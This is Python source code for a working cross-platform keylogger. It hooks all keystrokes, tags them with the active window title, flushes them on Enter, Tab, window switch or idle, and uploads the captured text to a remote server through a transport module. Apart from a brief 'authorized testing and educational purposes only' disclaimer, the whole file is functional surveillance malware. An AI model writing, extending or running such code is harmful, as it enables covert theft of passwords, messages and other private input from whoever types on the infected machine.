#!/usr/bin/env python3
"""
Cross-platform keystroke capture client.

Smart flushing on meaningful boundaries:
  - Enter key (line complete)
  - Tab key (field change / autocomplete)
  - Window switch (app context change)
  - Idle timeout (stopped typing - catches trailing words)
  - Buffer cap (safety net for long continuous typing)

Never flushes mid-word. Idle timeout ensures partial input
gets shipped after the user stops typing.

Usage:  python keylogger.py

NOTE: For authorized testing and educational purposes only.
"""

import logging
import platform
import queue
import signal
import subprocess
import sys
import threading
import time
import uuid
from datetime import datetime, timedelta
from typing import Optional

from pynput import keyboard
from pynput.keyboard import Key, KeyCode

from config import (
    BUFFER_CHAR_LIMIT,
    DEBUG_MODE,
    MINUTES_BETWEEN_TIMESTAMPS,
    UPLOAD_INTERVAL_SECONDS,
)
from transport import Transport

logging.basicConfig(
    level=logging.DEBUG if DEBUG_MODE else logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[logging.StreamHandler(sys.stdout)],
)
log = logging.getLogger("keylogger")

_SYSTEM = platform.system()

# ─── Window detection ──────────────────────────────────────────────────────────

if _SYSTEM == "Windows":
    import ctypes
    _u32 = ctypes.windll.user32  # type: ignore[attr-defined]

    def get_active_window() -> str:
        try:
            hwnd = _u32.GetForegroundWindow()
            length = _u32.GetWindowTextLengthW(hwnd)
            buf = ctypes.create_unicode_buffer(length + 1)
            _u32.GetWindowTextW(hwnd, buf, length + 1)
            return buf.value
        except Exception:
            return ""
else:
    def get_active_window() -> str:
        try:
            if _SYSTEM == "Linux":
                r = subprocess.run(
                    ["xdotool", "getactivewindow", "getwindowname"],
                    capture_output=True, text=True, timeout=1,
                )
                return r.stdout.strip() if r.returncode == 0 else ""
            elif _SYSTEM == "Darwin":
                r = subprocess.run(
                    ["osascript", "-e",
                     'tell application "System Events" to get name of '
                     "(first application process whose frontmost is true)"],
                    capture_output=True, text=True, timeout=1,
                )
                return r.stdout.strip() if r.returncode == 0 else ""
        except Exception:
            pass
        return ""


# ─── Monitor ──────────────────────────────────────────────────────────────────


class KeystrokeMonitor:
    def __init__(self) -> None:
        self._session_id = str(uuid.uuid4())
        self._transport = Transport(self._session_id)

        # Send queue - flush puts strings here, uploader ships them
        self._send_q: queue.Queue[Optional[str]] = queue.Queue()

        # Buffer (under _lock)
        self._buf = ""
        self._lock = threading.Lock()

        # Context
        self._cur_window = ""
        self._last_ts = datetime.now() - timedelta(minutes=MINUTES_BETWEEN_TIMESTAMPS)

        # Idle detection
        self._last_key_time = time.monotonic()
        self._idle_flushed = False

        # Keyboard state
        self._shift = False
        self._caps = False

        # Lifecycle
        self._running = False
        self._listener: Optional[keyboard.Listener] = None
        self._uploader: Optional[threading.Thread] = None
        self._idle_checker: Optional[threading.Thread] = None
        self._stop_event = threading.Event()

        log.info("Session %s", self._session_id)

    # ── buffer (caller must hold _lock) ──

    def _append(self, text: str) -> None:
        self._buf += text

    def _flush_locked(self) -> None:
        if self._buf:
            self._send_q.put(self._buf)
            self._buf = ""

    def _flush(self) -> None:
        with self._lock:
            self._flush_locked()

    # ── upload worker thread ──

    def _upload_loop(self) -> None:
        while self._running or not self._send_q.empty():
            batch: list[str] = []
            try:
                item = self._send_q.get(timeout=1.0)
                if item is None:
                    break
                batch.append(item)
            except queue.Empty:
                continue

            # Drain everything else ready
            while True:
                try:
                    item = self._send_q.get_nowait()
                    if item is None:
                        break
                    batch.append(item)
                except queue.Empty:
                    break

            if batch:
                payload = "".join(batch)
                if DEBUG_MODE:
                    print(f"[UPLOAD] {payload}")
                else:
                    try:
                        self._transport.upload(payload)
                    except Exception as e:
                        log.error("Upload: %s", e)

    # ── idle checker thread ──

    def _idle_loop(self) -> None:
        while self._running:
            time.sleep(0.5)
            elapsed = time.monotonic() - self._last_key_time
            if elapsed >= UPLOAD_INTERVAL_SECONDS and not self._idle_flushed:
                self._flush()
                self._idle_flushed = True
                try:
                    self._transport.flush_pending()
                except Exception:
                    pass

    # ── context (caller must hold _lock) ──

    def _check_context(self) -> None:
        win = get_active_window()
        if win and win != self._cur_window:
            self._flush_locked()
            self._cur_window = win
            self._append(f"\n[{win}]: ")

        now = datetime.now()
        if now - self._last_ts > timedelta(minutes=MINUTES_BETWEEN_TIMESTAMPS):
            self._last_ts = now
            self._append(f"[{now.strftime('%H:%M')}] ")

    # ── key handlers ──

    def _on_press(self, key: Optional[Key | KeyCode]) -> None:
        if key is None:
            return

        self._last_key_time = time.monotonic()
        self._idle_flushed = False

        with self._lock:
            self._check_context()

            if key == Key.space:
                self._append(" ")

            elif key == Key.enter:
                self._append("\n")
                self._flush_locked()

            elif key == Key.tab:
                self._append("\t")
                self._flush_locked()

            elif key == Key.backspace:
                if self._buf and self._buf[-1] not in ("\n", "\t", "]", " "):
                    self._buf = self._buf[:-1]
                else:
                    self._append("<BS>")

            elif key == Key.caps_lock:
                self._caps = not self._caps

            elif key in (Key.shift, Key.shift_r):
                self._shift = True

            elif isinstance(key, KeyCode) and key.char:
                ch = key.char
                if len(ch) == 1:
                    upper = self._caps != self._shift
                    self._append(ch.upper() if upper else ch.lower())

            # Safety cap
            if len(self._buf) >= BUFFER_CHAR_LIMIT:
                self._flush_locked()

    def _on_release(self, key: Optional[Key | KeyCode]) -> None:
        if key in (Key.shift, Key.shift_r):
            self._shift = False

    # ── lifecycle ──

    def start(self) -> None:
        self._running = True
        log.info("Platform:  %s", _SYSTEM)
        log.info("Flush on:  enter, tab, window switch, %ss idle, %d char cap",
                 UPLOAD_INTERVAL_SECONDS, BUFFER_CHAR_LIMIT)
        log.info("Press Ctrl+C to stop.")

        self._uploader = threading.Thread(target=self._upload_loop, daemon=True)
        self._uploader.start()

        self._idle_checker = threading.Thread(target=self._idle_loop, daemon=True)
        self._idle_checker.start()

        self._listener = keyboard.Listener(
            on_press=self._on_press,
            on_release=self._on_release,
        )
        self._listener.start()

        signal.signal(signal.SIGINT, lambda *_: self.stop())
        signal.signal(signal.SIGTERM, lambda *_: self.stop())

        while self._running:
            self._stop_event.wait(timeout=2.0)

    def stop(self) -> None:
        if not self._running:
            return
        self._running = False
        self._stop_event.set()

        if self._listener:
            self._listener.stop()
            self._listener = None

        self._flush()
        self._send_q.put(None)
        if self._uploader:
            self._uploader.join(timeout=5)

        self._transport.close()
        log.info("Stopped.")


if __name__ == "__main__":
    KeystrokeMonitor().start()
